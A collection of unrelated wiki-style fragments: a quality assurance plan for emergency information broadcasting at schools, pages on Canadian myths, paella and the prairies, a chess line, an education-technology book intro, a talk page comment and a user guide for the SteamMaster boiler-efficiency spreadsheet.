The procedures will ensure that accurate information is distributed effectively throughout a dense institutional population. The goals of this procedure will be to distribute accurate information with the correct approvals using sufficient technology and strategies. Having a universal means for broadcasting information is of severe need in many institutions. Thus allowing this QAP to strengthen their security procedures ad overall operations.

'''Describe the activities or tasks for each procedure:'''

The activities involved for my primary procedure for creating a survey will be to utilize a survey creation program and service called Surveymonkey. This will be an intricate process as I need to devise the right questions and take note of the length of the survey. Since the persons I will be asking to fill out the survey may be busy, I need to assure the questions are to the point, precise and will allow me to obtain the right information.

'''Explain when and how the activity will be executed, recorded, who will participate, reporting and follow-up for corrective action:'''

The activity will be executed by submitting a mass survey to the Department of Security at twenty-five different educational institutions. This activity will supply valuable information pertaining to security procedures. Security can be a life or death situation whereas implementing the standards which I have set within the QAP may or may not be applicable for some institutions. The goal as reiterated is to supply accurate information with hope to implement a set of standards and practices relating to that of distributing accurate information wirelessly to a set group within the institution.

'''Testing Activities:'''

One of the possible testing activities is to mentor the effectiveness of a newly implemented means for broadcasting information wirelessly and accurately within a given institution. This activity can allow trial and error data for other institutions who wish to implement the same or similar system. 

A second testing activity will be to privately test equipment which may be used in a practical situation. The only draw back here will be the funding to do so. This method may be a safer approach as performing mock trials is better then the possibility of risking life or death. 


===Documentation===

'''What type of documentation will be created to support management (user guides, computer system guides, interim reports, progress reports, final reports)'''

There will be several documents which will be created to support management. The most important document which will be created will be contingency plan guidelines. A troubleshooting guide for operating the equipment will as well be created. The technology is computer based, so understanding the operating system is a must and will be included within the ISO/IEC standards. For implementation purposes, there will be a final report which will be needed to fill out upon the completion of a security procedure. 


'''Explain how the documentation will be created, used and the guidelines and maintenance of the reports
'''
'''Contingency Plan guideline:''' This plan will list step-by-step the process necessary to carry out the correct action(s).
 '''Troubleshooting Guide:''' This guide will supply technical information for troubleshooting the central computer system and other technologies.
'''Final Report:''' This report will ensure the correct measures were taken and will be reviewed and analyzed for future reference. This data will also allow for the future development of my QAP.

'''Documentation for testing activities'''

The documentation for testing activities will be provided by the technical writer who is appointed to the QA Team. The step-by-step procedures and trial and error occurrences will be recorded by and filed appropriately. The information may or may not be included in the final phase of the QAP. 

===Measurements===

'''Purpose of Measurements'''

The purpose of the measurements will be to record the effectiveness of the new technology and implemented procedures. The process of distributing emergency information to a dense population in real-time can mislead people if the information is incorrect. These overall measurements will strengthen the QAP. 

'''Type of Measurements (example – calibration)'''

The main type of measurements I will be using will be calibration. This will allow me to review the before and after. This calibration will continue on a quarterly scale and will determine the effectiveness of the QAP. Following is a list of other applicable testing methods which may or may not be used:


'''Unit Testing:''' This testing will ensure the source code within the software used to launch mass information will work.

'''Functional testing:''' This testing will insure that all the functions of the software and product will operate according to the products advertised capabilities.

'''End-to-End testing:''' This type of testing may be used to mimic real life situation with regards to cellular, internet, intranet, and WiFi situations.

'''Regression testing:''' This type of testing will ensure the modification from a previous software or hardware was corrected.

'''
When and how Measurements will be used'''


The measurements will be used at the start of the QAP. Following, these measurements will continue on a quarterly scale. 

'''Reporting Measurements and checking for adequacy:'''

The QAP Team will assess and extrapolate the data from the testing measurements. The information will be used to strengthen the testing process. Errors will be corrected such as the shift from one type of computer hardware, or software to a more efficient type. 
Corrective Action Process
If there is an error within the trials or the QAP, this will be assessed and corrected by the QAP team. With this type of QAP, there are many errors which can default, though having a Team in place will hopefully catch these inefficiencies before they occur, or correct them immediately before the data is interrupted.

===Risk Management===

'''Type of Risk management plan, methodology, process, tools:''' 

The Risk Management Plan will include all known risks involved with the plan and will be created by the analysis team. The following six steps will be used to create the plan in full:

Define Risk Management, as it applies to your project
Identify the categories of risk 
List all of the types of risks which may occur 
Determine the likelihood of the risks occurring 
Calculate the impact on the project if risk does occur 
Rank the risks identified in order or priority (Method123, 2003)

Determining risk is a very difficult task and involves many different types of processes. Nonetheless risk management is a crucial part of a Quality Assurance Plan (QAP).
                                            

'''Procedures and methods to be used to identify and analyze the collected data to determine risk:'''

A system will be implemented which will record the amount of broadcasted transmissions from the Central Security Offices. This system will work to improve the quality of the newly implemented technology. I will be using a Risk Priority Number (RPN) to analyze the risk identified during the Failure Mode and Effects Analysis (FMEA). According to the following three rating scales will conclude tot the severity of a potential risk. 

Severity, which rates the severity of the potential effect of the failure. 

Occurrence, which rates the likelihood that the failure will occur. 

Detection, which rates the likelihood that the problem will be detected before it reaches the end-user/customer. 

The risk will then be calculate on a five point severity scale which will allow the true acknowledgement of the severity of the risk and the Analysis Team will then be able to correct the risk.

'''Determine the level of risk and tools used to manage risk in the project (risk matrix, risk mitigation plan:'''

When the Risk Priority Number (RPN) is identified and then used to determine the Failure Mode and Effects Analysis (FMEA), the collected data will be included into a final Risk Mitigation Plan. This plan will identify the severity of the risks, types of risks, and will address all possible solutions.

'''Describes the performance criteria for the analysis procedures:
'''
The project team will be involved in the analysis procedures. The data will be presented and the team will view the Matrix and the mitigation plan, as well as the survey answers. The types of pertinent technology will be discussed and a plan to implement it will be created. Section 7 concludes the performance criteria for the analysis procedures.

'''Corrective Action for Risks:'''

As issues arise such as possible software failure, hardware failure, or user error a Corrective Actions Plan will be created. This plan will include a detailed list of the problems and will have an associated number as well as an implementation date.

===Training===

'''Define and describe the training plans for the project:'''

The training plan will assure that all personnel are on the same level and understand how to effectively use the equipment as well as troubleshooting and error reporting. A training manual will be designed which will consist of procedures and troubleshooting chapters. 

'''Special training or certification that may be required to implement the plan:'''

There will not be any required certification though the following certifications are recommended:

•	Certified Software Quality Analyst (CSQA) 
•	Certified Software Tester (CSTE) 
•	Certified Software Project Manager (CSPM) 
•	COPC Registered Coordinator Training 
•	CBTL SM- 1 
•	CBQASM 
•	Six Sigma Black Belt 
•	Six Sigma Green Belt 
•	Accredited ITIL Foundation Course 
•	Foundation Certificate in ITSM
 
'''Training for the personnel:'''

All personnel within the Security Department will be trained on the Quality Assurance Plan. Troubleshooting and error reporting procedures will be included. 

'''Training process for corrective action and procedures (frequency of reports to management, plans for closeout activities to document lessons learned):'''

All staff will participate in error reporting and will contribute to the Bi-weekly Corrective Actions and Procedures Plan. This plan will consist of the problems that occurred and the corrective actions to take. The chosen committee will review this plan and upon approval the corrective actions will be implemented. 

===Analysis and Milestones===

'''Determine the milestones and process for overall corrective action:'''

The implemented technology will be monitored for a period of 12 months and all known issues will be recorded and transmitted real time to a central database. After 12 months, if all known software quarks and/or issues are not corrected and the issues do not lie in fault with the personnel, an alternative technology may be implemented which would start the QAP over at the beginning. 

===Results, Conclusion and Follow-Up===

'''Determine how results will be collected, reviewed, and list the different types of corrective action:'''

The results will be reviewed via a central database designed to retrieve data from the security offices with the implemented system. Each Security Office will have personnel who will be in charge of the troubleshooting and recording the issues. The types of possible corrective actions are as follow:

1.	Implement an entirely new system
2.	Use different wireless devices
3.	Change the training procedures
4.	Correct the issues and continue with current infrastructure

      <text xml:space="preserve">There are many myths about Canada or Canadians that are untrue or partially untrue. Many of these myths have to do with topics such as weather, culture and history.

== Common myths ==
'''Myth #1- Canadians do not have paved roads. ''' 

Canadians drive cars, ride bikes, walk and use public transit to get around, just as Americans do.  In some more rural areas, there are roads that are unpaved, but in most areas the roads are covered by asphalt.

 

'''Myth #2- Canada’s national sport is hockey'''

Canada actually has two national sports: ice hockey and lacrosse.  Lacrosse claims to have been a national sport of Canada far longer than hockey.  It is said that lacrosse was declared to be Canada's national sport in 1859, but no official record of that has ever been found&lt;ref&gt;&quot;A Short History of Lacrosse in Canada&quot;. Canadian Lacrosse Association. http://www.lacrosse.ca/Default.aspx?cid=83&amp;lang=1.&lt;/ref&gt;. In any event, it is worth noting that 1859 was eight years before Canada came into being as a nation.

In 1994, Bill C-121 made hockey the official Canadian winter sport and lacrosse became Canada’s official summer sport&lt;ref&gt;&quot;National Sports of Canada Act&quot;&lt;/ref&gt;. Although both sports are officially national sports, hockey is generally considered Canada’s most popular sport. Canadians also invented basketball in addition to hockey&lt;ref&gt;Bellis, Mary. &quot;History of Basketball - James Naismith.&quot; About.com: Inventors. About.com. 25 Mar 2009 &lt;http://inventors.about.com/library/inventors/blbasketball.htm&gt;&lt;/ref&gt;.


'''Myth #3- Canadian Policemen all dress in red.'''

Mounties wear red on special occasions, but are otherwise dressed in regular policing uniforms. The Royal Canadian Mounted Police (RCMP) is best known for its musical ride where policemen perform in costume. The RCMP is Canada’s national policing force that is employed by over 190 municipalities, 184 aboriginal communities and three of Canada’s international airports&lt;ref&gt;&quot;About the RCMP.&quot; Royal Canadian Mounted Police. 25 FEB 2009. Royal Canadian Mounted Police. 24 Mar 2009 &lt;http://www.rcmp-grc.gc.ca/about-ausujet/index-eng.htm&gt;.&lt;/ref&gt;.



'''Myth #4- All Canadians speak both official languages, English and French, and the words &quot;eh&quot; and &quot;aboot&quot; are commonly used by everyone.'''  

Some Canadians have an accent that consists of saying &quot;eh&quot; at the end of questions, but not all Canadians speak in the same way. Canada is a large country consisting of many cultures and languages. The most popular language in Canada is English followed by French, then Chinese. There are over 100 different languages spoken at home by Canadians. Not all Canadians speak French, just like not all Canadians speak English, although both are Canada’s official languages. A 2001 census reported that 9/10 Canadians speak either French or English at home, 59% of Canadians say that English is their mother-tongue (language spoken from childhood), while 23% of Canadians say that French is their mother tongue.&lt;ref&gt;http://canadaonline.about.com/cs/statistics/a/statslang.htm&lt;/ref&gt;
 

'''Myth #5- Canada is covered in several feet of snow all year round, and temperatures are always below freezing.'''

Although Canada does receive snow in the winter in most areas, highs above 30 degrees Celsius are often reached in the summer&lt;ref&gt;&quot;Climate and Weather in Canada : Trail Canada.&quot; Trail Canada. Perargo Media. 25 Mar 2009 &lt;http://www.trailcanada.com/canada/weather/&gt;.&lt;/ref&gt;. Canadian temperatures are extremely varied from location to location. The northern parts of Canada receive considerably more snow than cities closer to the United States border.

== Stereotypes from Canadian History ==
Cultures and people are often portrayed in stereotypical and frequently untrue ways, due to the fact that broad generalizations are often made, despite the fact that each person is different.  Many of the people belonging to each category did exhibit some or even all of the stereotypical traits at one time or another, but very few, if any, showed all of these traits all of the time.  Some of the most common misconceptions about historical people in Canada are listed below.

'''British:''' Inconsiderate brutes at some times, and at other times they are perfectly saintly &quot;good-guys.&quot;  Some textbooks portray the British settlers as either destroying the Indian way of life and culture and decimating the land, or being the heroic warriors who have gained territory or other assets for their glorious country.&lt;ref&gt;Cranny, Michael, Graham Jarvis, Garvin Moles, and Bruce Seney.Horizons: Canada Moves West. '1st ed'. Toronto, ON: Pearson Education Canada, Inc., 1999.&lt;/ref&gt;  In actuality, some were inconsiderate or brutish, perhaps by nature or because of the environment they were in, but the belief that these people had no respect for other cultures was more the fact that many felt their society to be superior to others. 
 
'''French:'''  People whose entire purpose is to ruin the plans of the British and to oppose their rule of North America.
 
'''Indians (First Nations)'''&lt;ref&gt;Francis, Daniel. National Dreams. illustrated. arsenal pulp press, 1997.&lt;/ref&gt;:  War-loving, sneaky, savage, innocent to the point that they were robbed of their land and furs by Europeans, cheated into trading luxurious furs for cheap and worthless trinkets and beads, heathens with no faith or religion, filthy, ferocious, superstitious peoples.
 
'''Metis:'''  Robbed of the buffalo by white settlers, when in fact they were also actively involved in the depletion

[[File:Paella 1719081168.jpg|right|thumb|400px|Mixed paella]]
'''Paella''' is a type of slow food. It takes at least two hours to make and should be savored over a long meal with family and friends. A paella meal in Spain has the same pacing as a Thanksgiving meal in the United States. However, many Spaniards cook paella every Sunday.

Paella originated in its modern form in the mid-19th century near lake Albufera, a lagoon near the eastern coast of Spain's Valencian region.&lt;ref name=&quot;Info about Paella on About.com&quot;&gt;[http://spanishfood.about.com/od/maincourses/a/paella.htm Info about Paella on About.com]&lt;/ref&gt;

Many non-Spaniards view paella as Spain's national dish. However, most Spaniards consider it to be a regional Valencian dish. Valencians, in turn, regard paella as one of their cultural symbols.

There are three widely known types of paella: Valencian paella, seafood paella and mixed paella; but there are many others as well. Valencian paella consists of white rice, green vegetables, meat, snails, beans and seasoning. Seafood paella replaces meat and snails with seafood and omits beans and green vegetables. Mixed paella is a free-style combination of meat, seafood, vegetables and sometimes beans.

Most paella chefs use calasparra&lt;ref name=&quot;DeliaOL&quot;&gt;[http://www.deliaonline.com/ingredients/rice,227,IN.html Delia Online - Rice]&lt;/ref&gt;&lt;ref name=&quot;tienda&quot;&gt;[http://www.tienda.com/reference/paellarice.html Tienda.com - Paella Rice]&lt;/ref&gt;or bomba&lt;ref name=&quot;tienda&quot;/&gt;rices for this dish. Other key ingredients include saffron and [[Cookbook:Olive Oil|olive oil]].

Paella has gained considerable popularity throughout most of the Spanish-speaking world and among Hispanics in the United States. It also enjoys moderate popularity throughout Western Europe.

      <text xml:space="preserve">The first province of the prairies was Manitoba.  It was created under the Manitoba act which made it a bilingual place where French and English were accepted as official languages.  The act created two official education systems: Roman Catholic and Protestant.  Most of Manitoba was populated by the Metis, who were discriminated by the government before Manitoba became a province. Many Metis were forced to sell their land or face imprisonment. 

== Bison ==
At one time, bison were plentiful in the prairies (prior to 1874-1875).  The impact the animal had on the prairies was enormous.  Bison fueled the economy because their hides created clothing but most importantly, bison meat was made into pemmican which was not only traded with the Hudson's Bay Company but supplied each place with enough food for the entire year.  From bison fueling the economy, bison also became the main industry in the prairies.  Bison had a strong impact on the prairies, which was apparent once the bison started to become extinct in the area.

== Climate ==
The main type of precipitation the prairie receives is known as convectional precipitation. Convectional precipitation is caused by convection currents in the atmosphere. When the air heats during the day, it expands and rises. It then meets cool air, which also warms, rises, and cools, creating a cloud of rain or hail, which falls back to Earth. Even though the dry prairies can use as much precipitation it can get, convectional precipitation is often unreliable because it's heavy and can damage crops and soil.

The southeast part of the prairies, near the Alberta-Saskatchewan border, is very dry. The driest area is known as the &quot;Palliser Triangle,&quot; named after Captain Palliser, who mapped British territory from Lake Superior to the Oregon Valley in an 1857-1860 expedition. The prairie in the northwest is moist enough to support ranching and agriculture, but never moist enough to support trees.  

In Canada, the provinces of: Alberta, Saskatchewan and Manitoba are commonly referred to as the prairies.  The land itself is filled with meadows and very few trees, but contains the natural vegetation of grasses and shrubs.  The prairies are the agricultural centre of Canada because of their very fertile soil, which has produced such goods as canola and wheat.

== Treaties ==
During 1870, Canada was looking for more land for European settlement and for Canadians to live on. The North-West Territories had no clearly defined border lines but the area was currently controlled by the Native people. The first negotiations for land were between W. Simpson, Indian Commissioner in the Department of Indian Affairs, and the Cree and Saulteaux. The first of many treaties to come was signed on August 3, 1874 which left the Native people with less than 60 percent of the land they originally had. Over the following years more treaties were to be signed. Native people were in the need for jobs after the treaty signings and depletion of the buffalo. The Metis were forced to learn to farm as a means of survival. Farming was aided by the government per the conditions of the treaties.

== Ecology ==
Ground squirrels, gophers, and prairie dogs are plentiful in this region.  Hawks, owls, and badgers are the predators of the gophers.  Deer and antelope have replaced the bison as the largest animals in this biome. Wild fowl are found in the region's many sloughs.
 
The natural vegetation of the grasslands includes several types of short grasses--sagebrush and cactus in the south, and some areas of long grasses.  Agriculture has completely destroyed some of the indigenous grasses.  Human activity has also led to wind erosion, although there is less wind erosion on the prairie today than during the 1930s.  At that time, much of the topsoil of the region was blown away after years of prolonged drought.The soil of this region are brown in colour and have a high mineral content.  Depending on the length of grasses, and so the amount of humus they would provide over many years, the soils will vary from light to dark brown.  The dark brown soil type is known as chernozem and is ideal for growing wheat and other grain crops.

White develops the Bishop so as to hinder Black's normal Dutch kingside formation by pinning the e-pawn. Black now has to choose to either drive the Bishop away or attempt to develop normally, without the help of ...e6. The usual ...Nf6 in Dutch formations can now be replied by Bxf6, foiling the usual setup.

      <text xml:space="preserve">{{book title|Transformative Applications in Education|Changing the way we teach and learn}}
[[File:Future Astronaut.jpg|left|300px]]
Educators and technologists have long held hope for technology to transform teaching and learning—to dramatically improve learning and reduce failure. In practice, much educational software has demonstrated little or no positive effect (see Overview). Educational software has tended to be behavioristic and didactic in which the software leads the student to correct answers. Constructivism, the prevailing learning theory for the past two decades, strongly suggests an alternative approach. In fact, this more student-centered approach using tool software, educational games, and simulations was found to lead to higher student achievement.

In this spirit, '''''Transformative Applications''''' explores several computer-based applications that help achieve the grail of transforming teaching and learning. In the pages that follow, there are a broad variety of applications. ''Phun'' is a physics animation system that captivates both children and adults. ''GeoGebra'' allows teachers and students to make animated connections between an abstract formula and the graph that it describes. ''Molecular Workbench'' aims to help young and old learn about the latest discoveries in molecular mechanics such as nanotechnology self-assembly. ''NetLogo'' is a classic agent-based simulation that models emergent phenomena in the sciences and social sciences. Some, like ''GIMP'' have been around many years, but it may still represent a powerful way to create and interact with still images. Some software is designed to transform learning in a narrow field in domains like the military and health care; ''Nerveblock Simulator'' is such an application designed to change how medical field learns new skills.

      <text xml:space="preserve">== a great printed textbook ==

This looks like the beginnings of a great book.
What do we need to do to turn this into a great printed textbook?

I see that some modules in this book come in 4 nearly-identical editions, such as
* [[Foundations of Education and Instructional Assessment/Edition 1/Table of Contents/Chapter 1/1.7.2]],
* [[Foundations of Education and Instructional Assessment/Edition 2/Table of Contents/Chapter 1/1.7.3]],
* [[Foundations of Education and Instructional Assessment/Edition 3/Foundations Table of Contents/Chapter 1/1.7.2]], and
* [[Foundations of Education and Instructional Assessment/Edition 4/Foundations Table of Contents/Chapter 1/1.7.1]].
So for the printed textbook,
* (a) Should we include all four editions? Or
* (b) Should we pick only the &quot;best&quot; version of each module, flipping a coin when they are about the same? (It looks to me like sometimes the &quot;latest&quot; edition is not always the best one). Or
* (c) Should we somehow create one merged page with the best parts of each original edition, a single page better than any one of these slightly-different original editions?

I think I would rather read (c), although (c) is more work than (a) or (b).
But is it possible to do (c) without messing up the learning process students get while putting together the next edition?

[[User:Rajaa krayem|Rajaa krayem]] ([[User talk:Rajaa krayem|talk]]) 02:50, 12 April 2009 (UTC)  I like to choose (C)for fairness and great diversity of knoledge,and being up to date for some teacher to take it as refrence.</text>

'''Using SteamMaster'''
SteamMaster was created using Microsoft Excel 2002. Protection was enabled to prevent accidental overwriting of calculated cells, although there is no password required. Excel 2002 allows protected cells to be selected, formatted, and pivot tables to be used. Other versions may not allow these functions. Therefore you may need to unprotect sheets to use SteamMaster.

'''Open SteamMaster'''
A dialog box will tell you that SteamMaster contains macros. Enable them. SteamMaster may also ask if you want to open as ready-only. Select no to allow editing and data entry. 

'''Calculations'''
Many steam properties are calculated using equations (curvefits) that match values from steam tables or properties books. The equations are not reproduced in the guide because they are visible in the spreadsheet cells.

'''SteamMaster Custom Menu'''
When you open SteamMaster, a custon &quot;SteamMaster&quot; menu is added to Excel. SteamMaster is fully functional as a spreadsheet, without the need to use any of the automated features in the SteamMaster Menu. However, the custon menu can facilitate the following functions:

'''''Add Boiler'''''
You can add a boiler manufacturer and model to the analysis from the database. A new worksheet tab is created and the boiler is added to the summary page. If the current model is not currently in the database, you can add one.

'''''Add boiler to Database'''''
You can add a boiler to the database by entering manufacturer, model and specifications.

'''''Add Trap Manufacturer'''''
You can add a steam trap to the database by completing manufacturer, model and specification fields. If the manufacturer is not in the pull-down menu, enter the new manufacturer.

'''''Boilers'''''
The Boiler Navigator will take you to specific Boiler tabs.

'''''Summary'''''
The Navigator will take you to the Summary Sheet.

'''''Delete Boiler Sheets'''''
You can add or delete boilers from the current project. For example, if you have two boilers, and SteamMaster was saved with four boilers, you can delete boiler sheets. This operation will also delete a boiler from the Summary Sheet. SteamMaster will ask if you want to delete each sheet one at a time. If you want to keep boilers 1 and 2, run &quot;Delete Boiler Sheets&quot; and respond &quot;no&quot; to the dialog box, &quot;Do you want to delete boiler number 2?&quot; Repeat &quot;no&quot; until you reach the last boiler that you want to delete, and respond &quot;yes.&quot;

'''''Calculate Savings Summary'''''
Normally, SteamMaster recalculates changes automatically. If however, you reset calculation to manual, this function will recalculate the results.

'''''Help''''' This manual is available in online help format, indexed by worksheet tabs.

==Summary Sheet==
The Summary Sheet allows you to enter information that is common to all boilers in the steam system and operating conditions for each boiler. It allows you to match boiler fuel use to fuel bills, and summarizes results from five potential system improvements. Data entry cells have a blue font. Other cells have labels and formulas that are protected. There is no password, but they are protected so you cannot inadvertently overwrite a formula.

==Operating Conditions==
'''Company ID'''
Identify the company in an appropriate manner.

'''Annual Operating Time (hours)'''
Enter the number of hours per year that any boiler operates. Individual boiler operation is specified later for each firing rate. The time that the system is hot is used to calculate losses from uninsulated pipes, and steam and trap leaks.

'''Elevation (feet)'''
Elevation in feet above sea level is used to calculate the atmospheric pressure, and therefore air density and steam properties at the boiler location.

'''Condensate Return(%)'''
Enter percentage of steam condensate that is returned to the boiler. Steam flow can be estimated from boiler firing rate (input Btu/hr) x boiler efficiency [default = 80%]/steam enthalpy [default = 1000 Btu/lb]. Look for a makeup water meter reading in a log or a chemical treatment company report.

'''Steam System Volume (ft3)'''
Steam Volume is used to calculate boiler cycling times (boiler shuts down) when system load is less than the minimum-firing rate. Many boiler manufacturers specify the &quot;steam chest&quot; or &quot;steam volume&quot; as the volume above the water level in a boiler. A curve fit for scotch marine boilers produced a default value [default = 0.2 ft3/hp]. System volume also includes piping. The Pipe Loss tab includes columns for surface area and volume for piping that you enter in the table.

'''Air Humidity Ratio (lbv/lb dry air)'''
The absolute humidity, specific humidity, or humidity ratio is the ratio of the mass of water vapor in a volume of air to the mass of dry air. It is used to calculate the boiler efficiency loss due to heating water vapor in combustion air. Absolute humidity can also be found from relative humidity and other air properties in psychometric charts.

==Temperatures==
'''Operating Steam Temperature (F)''' 
The saturated temperature (F) is calculated for the existing system Operating Pressure.

'''Proposed Steam Temperature (F)'''
The saturated steam temperature (F) is calculated for the Proposed system operating Pressure in the case you recommend reducing system pressure. 

'''Condensate Temperature (F)'''
The condensate temperature is calculated from the condensate return system pressure. For example, an atmospheric condensate system would have a condensate temperature of 212 F. Condensate temperature is used to calculate flash steam losses. Condensate loses heat in the process of returning to the boiler, and might arrive at 160-180 F. However, we base the flash steam calculation on the saturation temperature at the steam trap.

'''Inlet Air Temperature (F)'''
Combustion air is heated from inlet conditions to boiler stack conditions. Inlet air properties and used in combustion efficiency calculations. [default = 80 F]

'''Inlet Water Temperature (F)'''
Water is heated from inlet temperature to saturated steam at the system pressure. Well water and city water temperature both vary with location and season. [default = 50 F]

==Pressures==
'''Operating Pressure (psig)'''
System pressure varies with load and control range set points. Enter average operating pressure for existing system.

'''Proposed Pressure (psig)'''
Enter a higher or lower pressure if you recommend changing the pressure. Efficiency and losses are calculated using the proposed pressure and presented in the &quot;proposed&quot; columns.

'''Condensate return pressure (psig)'''
Condensate is usually reduced to atmospheric pressure (0 psig) at the steam trap and collected in a condensate tank. The condensate is then pumped back to the boiler room, usually to a feedwater tank. When saturated liquid is reduced in pressure, it becomes superheated. Some of the liquid flashes to vapor until the liquid temperature reaches the saturation temperature at the lower pressure. For example, when condensate at 100 psig is reduced to 0 psig. 13% of the condensate flashes to steam, which represents a significant system loss. A pressurized return will supply low-pressure steam that can be used for other purposes, including heating makeup water. Enter existing condensate return pressure. [default = 0 psig]

'''Atmospheric pressure (psia)'''
Atmospheric pressure (0 psig) is calculated in terms of absolute pressure (psia), compared with a perfect vacuum base on elevation and above sea level. For example, atmospheric pressure at sea level is 14.7 psia. Enter elevation and observe the calculated pressure, which is used in the calculations.

'''Pressure range (psi)'''
System pressure is maintained in a pressure range by the system controls, provided there is adequate boiler capacity to meet the load. When the boiler operates at pressure falls until the boiler restarts. Enter this control pressure range, which is used to calculate how long the boiler runs to raise the pressure this amount, and how long it stays off. Pressure range is used in the cycle loss calculations.

==Fuel==
'''Fuel Type'''
Choose the fuel type from a pull-down menu of six fuels (coal, No. 2 fuel oil, No. 6 fuel oil, natural gas, propane, and wood). Fuel properties affect efficiency calculations and are considered in more detail in the Fuel Sheet.

'''Fuel Cost ($/MMBtu)'''
Enter fuel cost dollars/ million Btu.

==Boiler Summaries==
The boiler summary tables allow you to enter firing rates and operating hours for each boiler and to match total fuel use for all boilers to fuel bills. It then summarizes existing and proposed efficiencies and energy use and savings for each firing rate, total for each boiler, and total for system.

'''Firing Rate'''
Enter up to four firing rates, expressed as a percentage of full fire, for each boiler and hours that each boiler operates at each rate.

'''Annual Hours'''
Enter hours that each boiler operates at each firing rate. Note that total operating hours for each boiler at all firing rates is calculated at the bottom of each table.

'''Efficiencies'''
Calculations of efficiencies for existing and proposed conditions are calculated in each boiler sheet and summarized. 

'''Cost Savings'''
The difference between existing and proposed conditions yields energy and cost savings, at the fuel cost you entered.

'''Boiler Annual Energy Use (MMBtu/yr)'''
Annual energy use for existing and proposed conditions is totaled for each boiler individually and for the system in the Savings Summary table at the bottom.

==Savings Summary==
'''Recommendations'''
Savings for five potential system improvements are summarized. Not all opportunities apply to all systems, and there are other opportunities that are not included. The five recommendation are:

  - Tune Boilers
  - Insulate Steam Pipes
  - Repair Steam Leaks
  - Repair Trap Leaks
  - Recover Flash Steam

'''Tune Boilers'''
Existing and proposed boiler efficiencies are calculated using the AMSE Indirect Method in the individual boiler sheets. Energy and cost savings for steam system are included in the summary table.

'''Insulated Steam Pipes'''
Results from insulating uninsulated steam pipes are summarized from the Pipe Loss sheet. The efficiencies are losses expressed as a percentage of use. The proposed conditions assume that most of the pipe heat loss will be recovered with insulation. Enter the proposed heat loss as a percentage of uninsulated heat loss for the insulation you select in the Pipe Heat Loss Factors table on the Pipe Loss sheet. [default = 10 %]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings.


'''Repair Steam Leaks'''
Heat losses for steam leaks are calculated on the Steam Leaks tab and summarized here. Enter the proposed steam leaks as a percentage of existing steam leaks. [default = 10%]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings. 

'''Repair Trap Leaks'''
Heat losses for steam traps are calculated on the Trap Leaks tab and summarized here. Enter the proposed trap leaks as a percentage of existing trap leaks. [default = 10%]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings.

'''Recover Flash Steam'''
Condensate is usually reduced to atmospheric pressure(0 psig) at the steam trap and collected in a condensate tank. The condensate is the pumped back to the boiler room, usually to a feedwater tank. When saturated liquid is reduced in pressure, it becomes superheeated. Some of the liquid flashes to vapor until the liquid temperature reaches the saturation temperature at the lower pressure. For example, when condensate at 100 psig is reduced to 0 psig, 13% of the condensate flashes to steam. Because the latent heat of vaporization at atmospheric pressure is 970 Btu/lb this represents a significant system loss. The existing efficiency and energy column presents this heat loss for the system and condensate system pressure, divided by system boiler efficiency.

A pressurized condensate return system will allow you to recover some or all of the flash steam. Low-pressure steam can be used for other purposes, including heating makeup water, using existing condensate return (%). The savings column show the calculation for the amount of flash steam that could be used to heat makeup water directly in the makeup water or deaerator tank without adding additional heat exchangers. The proposed column shows the remaining quantity of flash steam that is available. If you identify a use and a system to apply it, then reduce the proposed steam use, and the savings will increase proportionately. Note that both the flash steam quantity and use for makeup water vary with condensate system pressure and condensate return percentage.

'''Total'''
System efficiencies are boiler efficiencies, including radiation, convection and cycling losses, minus the four identified system losses: uninsulated pipes, steam leaks, trap leaks, and flash steam. Total existing and proposed system energy use is less meaningful because boiler use (shown on the tune boiler recommendation row) includes system losses. However, the total energy and cost savings for the five recommendations is the result of system improvements.

==Boiler Sheets==
Enter information in the cells where font is in blue. For each individual boiler sheet, enter information that is specific to the corresponding boiler.

===Boiler Nameplate===

'''Manufacturer'''
There is a database of boiler manufacturers, models and specifications on the Boiler Mfgrs sheet. you may add a boiler from the database or add a new boiler to the database.

'''Model'''
Enter the model from the nameplate.

'''HorsePower'''
Boiler horsepower is different than electrical or mechanical horsepower. If boiler horsepower is not on the nameplate, you might find one of the following conversions helpful:

  - 1 boHP = 33,500 Btu/hr
  - 1 boHP = 34.5 lb/hr of steam
  - 1 boHP = 5 ft^2 of heat transfer surface (rule of thumb)

'''Maximum Firing Rate'''
Enter in MMBTU/hr for all fuels. This is input rate, and therefore should be around 40,000 Btu/hr-BoHP.

'''Boiler Type'''
Choose the boiler type from a pull-down menu among five types:

  - Cast Iron Sectional
  - Fire Tube
  - Hot Water
  - Scotch Marine
  - Water Tube

'''Minimum Firing Rate'''
The lowest rate at which the boiler can operate is usually between 10 and 40%, the smaller rate for larger boilers. Turndown is the ratio of maximum to minimum fire. Minimum fire affects boiler cycling losses at loads below minimum fire.

'''Control Type'''
Choose the control type from a pull-down menu among three types:

  - Full Modulating
  - Low-High-Low
  - On-Off

==Cycling Losses==
When a boiler cycles off and on, air is blown through the combustion chamber to remove unburned fuel before ignition for safety reasons. Purge cycles carry energy from the system and constitute a loss, the magnitude of which depends on cycle times. The following is a combination empirical and calculated approach to estimating cycle losses.

'''Purge air temperature'''
During the purge cycle air is blown through the boiler. In theory the exit temperature can be calculated; in practice it is a complicated calculation. Based on several measurements, we use the exit air temperature as percentage of saturated steam temperature, both relative to inlet air temperature, in our heat loss calculations. [default = 75%]

'''Purge Cycle Time'''
This value is the time during which air is blown through the boiler without fuel for the purge cycle. Enter the average time in seconds for both pre (before burner) and post-purges. The program assumes both purges are the same and multiplies by 2 to account for both pre and post purges. [default = 30 seconds]

'''Standby Cycle Time'''
It is the time for a complete boiler cycle when the standby load is less than the boiler minimum firing rate. The approach is the calculate the amount of time that the boiler will require to raise the pressure in the system volume by the controls pressure range amount. It further considers the ratio of the boilers load to the minimum firing rate to calculate how long the boiler can stay off. The cycle time includes pre and post purges, burner operation, and the time boiler is off. Cycle time is used to calculate the cycling losses when the boiler is on standby firing rate. 

==Stacking Conditions==
'''o2 (%)''' Most combustion analyzers or stack gs sensor measure the volumetric percentage of oxygen in the stack gas. Enter the measured value.

'''CO2 (%)''' SteamMaster calculates Carbon dioxide concentration on a volumetric basis. Some test equipment measures CO2 instead. If your does, you will have to lookup the corresponding O2 concentration to use SteamMaster.

'''CO (ppm)'''
